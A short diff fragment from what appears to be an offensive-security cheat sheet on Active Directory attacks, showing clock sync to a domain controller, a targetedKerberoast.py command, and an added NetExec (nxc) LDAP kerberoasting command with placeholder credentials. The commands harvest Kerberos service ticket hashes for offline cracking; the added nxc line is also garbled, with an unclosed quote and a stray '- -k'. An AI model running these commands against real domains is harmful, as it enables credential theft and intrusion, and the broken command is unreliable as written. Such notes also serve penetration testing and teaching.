@@ -148,6 +148,8 @@ timedatectl set-ntp off
 sudo ntpdate $DC_IP
 
 targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+
+nxc ldap $DC_IP -u 'username' -p 'password --kerberoast - -k
 ```
 
 ---
